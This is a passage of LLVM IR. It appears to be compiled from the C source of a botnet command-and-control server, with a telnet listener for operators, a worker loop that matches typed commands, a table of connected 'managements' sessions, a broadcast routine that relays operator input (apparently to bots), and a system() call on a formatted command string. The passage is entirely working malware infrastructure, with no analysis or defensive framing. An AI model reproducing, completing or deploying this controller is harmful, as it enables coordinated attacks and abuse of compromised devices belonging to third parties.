  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i64 0, i64 0), i64 72, i32 1, i1 false)
  %841 = call i64 @strlen(i8* nonnull %97) #9
  %842 = call i64 @send(i32 %93, i8* nonnull %97, i64 %841, i32 16384) #10
  %843 = icmp eq i64 %842, -1
  br i1 %843, label %.loopexit209.loopexit, label %844

; <label>:844:                                    ; preds = %837, %840
  %845 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.154, i64 0, i64 0)) #9
  %846 = icmp eq i8* %845, null
  br i1 %846, label %851, label %847

; <label>:847:                                    ; preds = %844
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.155, i64 0, i64 0), i64 57, i32 1, i1 false)
  %848 = call i64 @strlen(i8* nonnull %97) #9
  %849 = call i64 @send(i32 %93, i8* nonnull %97, i64 %848, i32 16384) #10
  %850 = icmp eq i64 %849, -1
  br i1 %850, label %.loopexit209.loopexit, label %851

; <label>:851:                                    ; preds = %844, %847
  %852 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i64 0, i64 0)) #9
  %853 = icmp eq i8* %852, null
  br i1 %853, label %858, label %854

; <label>:854:                                    ; preds = %851
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i64 0, i64 0), i64 72, i32 1, i1 false)
  %855 = call i64 @strlen(i8* nonnull %97) #9
  %856 = call i64 @send(i32 %93, i8* nonnull %97, i64 %855, i32 16384) #10
  %857 = icmp eq i64 %856, -1
  br i1 %857, label %.loopexit209.loopexit, label %858

; <label>:858:                                    ; preds = %851, %854
  %859 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.158, i64 0, i64 0)) #9
  %860 = icmp eq i8* %859, null
  br i1 %860, label %865, label %861

; <label>:861:                                    ; preds = %858
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.159, i64 0, i64 0), i64 124, i32 1, i1 false)
  %862 = call i64 @strlen(i8* nonnull %97) #9
  %863 = call i64 @send(i32 %93, i8* nonnull %97, i64 %862, i32 16384) #10
  %864 = icmp eq i64 %863, -1
  br i1 %864, label %.loopexit209.loopexit, label %865

; <label>:865:                                    ; preds = %858, %861
  %866 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i64 0, i64 0)) #9
  %867 = icmp eq i8* %866, null
  br i1 %867, label %872, label %868

; <label>:868:                                    ; preds = %865
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i64 0, i64 0), i64 103, i32 1, i1 false)
  %869 = call i64 @strlen(i8* nonnull %97) #9
  %870 = call i64 @send(i32 %93, i8* nonnull %97, i64 %869, i32 16384) #10
  %871 = icmp eq i64 %870, -1
  br i1 %871, label %.loopexit209.loopexit, label %872

; <label>:872:                                    ; preds = %865, %868
  %873 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.162, i64 0, i64 0)) #9
  %874 = icmp eq i8* %873, null
  br i1 %874, label %879, label %875

; <label>:875:                                    ; preds = %872
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i64 0, i64 0), i64 74, i32 1, i1 false)
  %876 = call i64 @strlen(i8* nonnull %97) #9
  %877 = call i64 @send(i32 %93, i8* nonnull %97, i64 %876, i32 16384) #10
  %878 = icmp eq i64 %877, -1
  br i1 %878, label %.loopexit209.loopexit, label %879

; <label>:879:                                    ; preds = %872, %875
  %880 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.164, i64 0, i64 0)) #9
  %881 = icmp eq i8* %880, null
  br i1 %881, label %886, label %882

; <label>:882:                                    ; preds = %879
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i64 0, i64 0), i64 74, i32 1, i1 false)
  %883 = call i64 @strlen(i8* nonnull %97) #9
  %884 = call i64 @send(i32 %93, i8* nonnull %97, i64 %883, i32 16384) #10
  %885 = icmp eq i64 %884, -1
  br i1 %885, label %.loopexit209.loopexit, label %886

; <label>:886:                                    ; preds = %879, %882
  %887 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i64 0, i64 0)) #9
  %888 = icmp eq i8* %887, null
  br i1 %888, label %893, label %889

; <label>:889:                                    ; preds = %886
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i64 0, i64 0), i64 74, i32 1, i1 false)
  %890 = call i64 @strlen(i8* nonnull %97) #9
  %891 = call i64 @send(i32 %93, i8* nonnull %97, i64 %890, i32 16384) #10
  %892 = icmp eq i64 %891, -1
  br i1 %892, label %.loopexit209.loopexit, label %893

; <label>:893:                                    ; preds = %886, %889
  %894 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.168, i64 0, i64 0)) #9
  %895 = icmp eq i8* %894, null
  br i1 %895, label %900, label %896

; <label>:896:                                    ; preds = %893
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.169, i64 0, i64 0), i64 74, i32 1, i1 false)
  %897 = call i64 @strlen(i8* nonnull %97) #9
  %898 = call i64 @send(i32 %93, i8* nonnull %97, i64 %897, i32 16384) #10
  %899 = icmp eq i64 %898, -1
  br i1 %899, label %.loopexit209.loopexit, label %900

; <label>:900:                                    ; preds = %893, %896
  %901 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i64 0, i64 0)) #9
  %902 = icmp eq i8* %901, null
  br i1 %902, label %907, label %903

; <label>:903:                                    ; preds = %900
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i64 0, i64 0), i64 74, i32 1, i1 false)
  %904 = call i64 @strlen(i8* nonnull %97) #9
  %905 = call i64 @send(i32 %93, i8* nonnull %97, i64 %904, i32 16384) #10
  %906 = icmp eq i64 %905, -1
  br i1 %906, label %.loopexit209.loopexit, label %907

; <label>:907:                                    ; preds = %900, %903
  %908 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i64 0, i64 0)) #9
  %909 = icmp eq i8* %908, null
  br i1 %909, label %914, label %910

; <label>:910:                                    ; preds = %907
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.173, i64 0, i64 0), i64 74, i32 1, i1 false)
  %911 = call i64 @strlen(i8* nonnull %97) #9
  %912 = call i64 @send(i32 %93, i8* nonnull %97, i64 %911, i32 16384) #10
  %913 = icmp eq i64 %912, -1
  br i1 %913, label %.loopexit209.loopexit, label %914

; <label>:914:                                    ; preds = %907, %910
  %915 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i64 0, i64 0)) #9
  %916 = icmp eq i8* %915, null
  br i1 %916, label %921, label %917

; <label>:917:                                    ; preds = %914
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.175, i64 0, i64 0), i64 74, i32 1, i1 false)
  %918 = call i64 @strlen(i8* nonnull %97) #9
  %919 = call i64 @send(i32 %93, i8* nonnull %97, i64 %918, i32 16384) #10
  %920 = icmp eq i64 %919, -1
  br i1 %920, label %.loopexit209.loopexit, label %921

; <label>:921:                                    ; preds = %914, %917
  %922 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.176, i64 0, i64 0)) #9
  %923 = icmp eq i8* %922, null
  br i1 %923, label %924, label %927

; <label>:924:                                    ; preds = %921
  %925 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.177, i64 0, i64 0)) #9
  %926 = icmp eq i8* %925, null
  br i1 %926, label %935, label %927

; <label>:927:                                    ; preds = %924, %921
  %928 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %149, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.178, i64 0, i64 0), i8** nonnull %150, i8** nonnull %151, i8** nonnull %152) #10
  %929 = call i32 @system(i8* nonnull %149) #10
  %930 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i64 0, i64 0), i8** nonnull %150, i8** nonnull %151, i8** nonnull %152)
  %931 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i64 0, i64 0), i8** nonnull %150, i8** nonnull %151, i8** nonnull %152) #10
  %932 = call i64 @strlen(i8* nonnull %97) #9
  %933 = call i64 @send(i32 %93, i8* nonnull %97, i64 %932, i32 16384) #10
  %934 = icmp eq i64 %933, -1
  br i1 %934, label %.loopexit209.loopexit, label %935

; <label>:935:                                    ; preds = %924, %927
  %936 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.180, i64 0, i64 0)) #9
  %937 = icmp eq i8* %936, null
  br i1 %937, label %942, label %938

; <label>:938:                                    ; preds = %935
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.181, i64 0, i64 0), i64 72, i32 1, i1 false)
  %939 = call i64 @strlen(i8* nonnull %97) #9
  %940 = call i64 @send(i32 %93, i8* nonnull %97, i64 %939, i32 16384) #10
  %941 = icmp eq i64 %940, -1
  br i1 %941, label %.loopexit209.loopexit, label %942

; <label>:942:                                    ; preds = %935, %938
  %943 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i64 0, i64 0)) #9
  %944 = icmp eq i8* %943, null
  br i1 %944, label %949, label %945

; <label>:945:                                    ; preds = %942
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.183, i64 0, i64 0), i64 71, i32 1, i1 false)
  %946 = call i64 @strlen(i8* nonnull %97) #9
  %947 = call i64 @send(i32 %93, i8* nonnull %97, i64 %946, i32 16384) #10
  %948 = icmp eq i64 %947, -1
  br i1 %948, label %.loopexit209.loopexit, label %949

; <label>:949:                                    ; preds = %942, %945
  %950 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i64 0, i64 0)) #9
  %951 = icmp eq i8* %950, null
  br i1 %951, label %956, label %952

; <label>:952:                                    ; preds = %949
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.185, i64 0, i64 0), i64 76, i32 1, i1 false)
  %953 = call i64 @strlen(i8* nonnull %97) #9
  %954 = call i64 @send(i32 %93, i8* nonnull %97, i64 %953, i32 16384) #10
  %955 = icmp eq i64 %954, -1
  br i1 %955, label %.loopexit209.loopexit, label %956

; <label>:956:                                    ; preds = %949, %952
  %957 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i64 0, i64 0)) #9
  %958 = icmp eq i8* %957, null
  br i1 %958, label %963, label %959

; <label>:959:                                    ; preds = %956
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i64 0, i64 0), i64 71, i32 1, i1 false)
  %960 = call i64 @strlen(i8* nonnull %97) #9
  %961 = call i64 @send(i32 %93, i8* nonnull %97, i64 %960, i32 16384) #10
  %962 = icmp eq i64 %961, -1
  br i1 %962, label %.loopexit209.loopexit, label %963

; <label>:963:                                    ; preds = %956, %959
  %964 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i64 0, i64 0)) #9
  %965 = icmp eq i8* %964, null
  br i1 %965, label %970, label %966

; <label>:966:                                    ; preds = %963
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.189, i64 0, i64 0), i64 80, i32 1, i1 false)
  %967 = call i64 @strlen(i8* nonnull %97) #9
  %968 = call i64 @send(i32 %93, i8* nonnull %97, i64 %967, i32 16384) #10
  %969 = icmp eq i64 %968, -1
  br i1 %969, label %.loopexit209.loopexit, label %970

; <label>:970:                                    ; preds = %963, %966
  %971 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i64 0, i64 0)) #9
  %972 = icmp eq i8* %971, null
  br i1 %972, label %977, label %973

; <label>:973:                                    ; preds = %970
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.191, i64 0, i64 0), i64 73, i32 1, i1 false)
  %974 = call i64 @strlen(i8* nonnull %97) #9
  %975 = call i64 @send(i32 %93, i8* nonnull %97, i64 %974, i32 16384) #10
  %976 = icmp eq i64 %975, -1
  br i1 %976, label %.loopexit209.loopexit, label %977

; <label>:977:                                    ; preds = %970, %973
  %978 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i64 0, i64 0)) #9
  %979 = icmp eq i8* %978, null
  br i1 %979, label %984, label %980

; <label>:980:                                    ; preds = %977
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.193, i64 0, i64 0), i64 75, i32 1, i1 false)
  %981 = call i64 @strlen(i8* nonnull %97) #9
  %982 = call i64 @send(i32 %93, i8* nonnull %97, i64 %981, i32 16384) #10
  %983 = icmp eq i64 %982, -1
  br i1 %983, label %.loopexit209.loopexit, label %984

; <label>:984:                                    ; preds = %977, %980
  %985 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.194, i64 0, i64 0)) #9
  %986 = icmp eq i8* %985, null
  br i1 %986, label %991, label %987

; <label>:987:                                    ; preds = %984
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.195, i64 0, i64 0), i64 71, i32 1, i1 false)
  %988 = call i64 @strlen(i8* nonnull %97) #9
  %989 = call i64 @send(i32 %93, i8* nonnull %97, i64 %988, i32 16384) #10
  %990 = icmp eq i64 %989, -1
  br i1 %990, label %.loopexit209.loopexit, label %991

; <label>:991:                                    ; preds = %984, %987
  %992 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i64 0, i64 0)) #9
  %993 = icmp eq i8* %992, null
  br i1 %993, label %998, label %994

; <label>:994:                                    ; preds = %991
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i64 0, i64 0), i64 25, i32 1, i1 false)
  %995 = call i64 @strlen(i8* nonnull %97) #9
  %996 = call i64 @send(i32 %93, i8* nonnull %97, i64 %995, i32 16384) #10
  %997 = icmp eq i64 %996, -1
  br i1 %997, label %.loopexit209.loopexit, label %998

; <label>:998:                                    ; preds = %991, %994
  %999 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i64 0, i64 0)) #9
  %1000 = icmp eq i8* %999, null
  br i1 %1000, label %1005, label %1001

; <label>:1001:                                   ; preds = %998
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i64 0, i64 0), i64 25, i32 1, i1 false)
  %1002 = call i64 @strlen(i8* nonnull %97) #9
  %1003 = call i64 @send(i32 %93, i8* nonnull %97, i64 %1002, i32 16384) #10
  %1004 = icmp eq i64 %1003, -1
  br i1 %1004, label %.loopexit209.loopexit, label %1005

; <label>:1005:                                   ; preds = %998, %1001
  %1006 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i64 0, i64 0)) #9
  %1007 = icmp eq i8* %1006, null
  br i1 %1007, label %1008, label %.loopexit210

; <label>:1008:                                   ; preds = %1005
  %1009 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i64 0, i64 0)) #9
  %1010 = icmp eq i8* %1009, null
  br i1 %1010, label %1011, label %.loopexit210

; <label>:1011:                                   ; preds = %1008
  %1012 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.202, i64 0, i64 0)) #9
  %1013 = icmp eq i8* %1012, null
  br i1 %1013, label %1014, label %.loopexit210

; <label>:1014:                                   ; preds = %1011
  %1015 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i64 0, i64 0)) #9
  %1016 = icmp eq i8* %1015, null
  br i1 %1016, label %1017, label %.loopexit210

; <label>:1017:                                   ; preds = %1014
  %1018 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.204, i64 0, i64 0)) #9
  %1019 = icmp eq i8* %1018, null
  br i1 %1019, label %1020, label %.loopexit.loopexit

; <label>:1020:                                   ; preds = %1017
  %1021 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i64 0, i64 0)) #9
  %1022 = icmp eq i8* %1021, null
  br i1 %1022, label %1023, label %.loopexit.loopexit

; <label>:1023:                                   ; preds = %1020
  call void @trim(i8* nonnull %96)
  %1024 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %1025 = call i64 @strlen(i8* nonnull %97) #9
  %1026 = call i64 @send(i32 %93, i8* nonnull %97, i64 %1025, i32 16384) #10
  %1027 = icmp eq i64 %1026, -1
  br i1 %1027, label %.loopexit.loopexit, label %1028

; <label>:1028:                                   ; preds = %1023
  %1029 = call i64 @strlen(i8* nonnull %96) #9
  %1030 = icmp eq i64 %1029, 0
  br i1 %1030, label %.backedge, label %1031

; <label>:1031:                                   ; preds = %1028
  %1032 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %1033 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %1034 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1033, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %1035 = call i32 @fclose(%struct._IO_FILE* %1033)
  call void @broadcast(i8* nonnull %96, i32 undef, i8* undef)
  call void @llvm.memset.p0i8.i64(i8* nonnull %96, i8 0, i64 2048, i32 16, i1 false)
  br label %.backedge

.backedge:                                        ; preds = %1031, %350, %396, %447, %513, %555, %663, %717, %1028
  %1036 = call i32 @fdgets(i8* nonnull %96, i32 2048, i32 %93)
  %1037 = icmp sgt i32 %1036, 0
  br i1 %1037, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %1020, %1017, %.backedge, %1023, %717, %713, %709, %705, %701, %697, %693, %689, %684, %663, %659, %655, %651, %647, %643, %639, %635, %631, %627, %623, %619, %615, %611, %607, %603, %599, %595, %591, %587, %583, %579, %575, %570, %555, %551, %547, %543, %539, %534, %513, %509, %505, %501, %497, %493, %489, %485, %481, %477, %473, %469, %465, %447, %443, %439, %435, %431, %427, %423, %419, %414, %396, %392, %388, %384, %380, %376, %372, %368, %350, %346, %342, %338, %334, %330, %326, %322, %318, %314, %310, %306
  br label %.loopexit

.loopexit.loopexit313:                            ; preds = %276, %271, %267, %263, %259, %256, %253, %.loopexit210
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit313, %.loopexit.loopexit, %140, %244, %240, %230, %133, %129, %118, %114, %._crit_edge, %745, %734, %726, %248
  %sext = shl i64 %92, 32
  %1038 = ashr exact i64 %sext, 32
  %1039 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1038, i32 1
  store i32 0, i32* %1039, align 4
  %1040 = call i32 @close(i32 %93) #10
  %1041 = load volatile i32, i32* @managesConnected, align 4
  %1042 = add nsw i32 %1041, -1
  store volatile i32 %1042, i32* @managesConnected, align 4
  br label %.loopexit209

.loopexit209.loopexit:                            ; preds = %756, %763, %770, %783, %803, %819, %826, %833, %840, %847, %854, %861, %868, %875, %882, %889, %896, %903, %910, %917, %927, %938, %945, %952, %959, %966, %973, %980, %987, %994, %1001
  br label %.loopexit209

.loopexit209:                                     ; preds = %.loopexit209.loopexit, %.loopexit
  ret i8* null
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fgetc(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @rewind(%struct._IO_FILE* nocapture) local_unnamed_addr #3

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #3

declare i32 @resolve(...) local_unnamed_addr #1

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @telnetListener(i32) #5 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca { i64, i64 }, align 8
  %tmpcast = bitcast { i64, i64 }* %4 to %struct.sockaddr_in*
  %5 = alloca i64, align 8
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i64 0, i64 0)) #12
  br label %9

; <label>:9:                                      ; preds = %8, %1
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64 0, i64* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 0, i32* %13, align 4
  %14 = trunc i32 %0 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %18 = call i32 @bind(i32 %6, %struct.sockaddr* nonnull %17, i32 16) #10
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %9
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i64 0, i64 0)) #12
  br label %21

; <label>:21:                                     ; preds = %20, %9
  %22 = call i32 @listen(i32 %6, i32 5) #10
  store i32 16, i32* %2, align 4
  %23 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i64 0, i32 0
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %tmpcast, i64 0, i32 2, i32 0
  %25 = bitcast { i64, i64 }* %4 to %struct.sockaddr*
  br label %26

; <label>:26:                                     ; preds = %42, %21
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.209, i64 0, i64 0))
  %28 = load i64, i64* %23, align 8
  call void @client_addr(i64 %28, i64 undef)
  %29 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %30 = load i32, i32* %24, align 4
  %31 = and i32 %30, 255
  %32 = lshr i32 %30, 8
  %33 = and i32 %32, 255
  %34 = lshr i32 %30, 16
  %35 = and i32 %34, 255
  %36 = lshr i32 %30, 24
  %37 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.211, i64 0, i64 0), i32 %31, i32 %33, i32 %35, i32 %36)
  %38 = call i32 @fclose(%struct._IO_FILE* %29)
  %39 = call i32 @accept(i32 %6, %struct.sockaddr* nonnull %25, i32* nonnull %2) #10
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %26
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.212, i64 0, i64 0)) #12
  br label %42

; <label>:42:                                     ; preds = %41, %26
  %43 = sext i32 %39 to i64
  %44 = inttoptr i64 %43 to i8*
  %45 = call i32 @pthread_create(i64* nonnull %5, %union.pthread_attr_t* null, i8* (i8*)* nonnull @telnetWorker, i8* %44) #10
  br label %26
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture readonly, i8** nocapture readnone) local_unnamed_addr #0 {
  %4 = alloca %struct.epoll_event, align 4
  %5 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %6 = icmp eq i32 %0, 4
  br i1 %6, label %11, label %7

; <label>:7:                                      ; preds = %3
  %8 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %9 = load i8*, i8** %1, align 8
  %10 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %8, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.213, i64 0, i64 0), i8* %9) #12
  tail call void @exit(i32 1) #13
  unreachable

; <label>:11:                                     ; preds = %3
  %12 = getelementptr inbounds i8*, i8** %1, i64 3
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 @atoi(i8* %13) #9
  %15 = getelementptr inbounds i8*, i8** %1, i64 2
  %16 = load i8*, i8** %15, align 8
  %17 = tail call i32 @atoi(i8* %16) #9
  %18 = icmp sgt i32 %17, 1000
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %11
  %puts13 = tail call i32 @puts(i8* getelementptr inbounds ([86 x i8], [86 x i8]* @str.1, i64 0, i64 0))
  ret i32 0

; <label>:20:                                     ; preds = %11
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([110 x i8], [110 x i8]* @str, i64 0, i64 0))
  %21 = getelementptr inbounds i8*, i8** %1, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = tail call fastcc i32 @create_and_bind(i8* %22)
  store volatile i32 %23, i32* @listenFD, align 4
  %24 = load volatile i32, i32* @listenFD, align 4
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %27

; <label>:26:                                     ; preds = %20
  tail call void @abort() #13
  unreachable

; <label>:27:                                     ; preds = %20
  %28 = load volatile i32, i32* @listenFD, align 4
  %29 = tail call fastcc i32 @make_socket_non_blocking(i32 %28)
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  tail call void @abort() #13
  unreachable

; <label>:32:                                     ; preds = %27
  %33 = load volatile i32, i32* @listenFD, align 4
  %34 = tail call i32 @listen(i32 %33, i32 128) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %32
  tail call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.216, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:37:                                     ; preds = %32
  %38 = tail call i32 @epoll_create1(i32 0) #10
  store volatile i32 %38, i32* @epollFD, align 4
  %39 = load volatile i32, i32* @epollFD, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %37
  tail call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

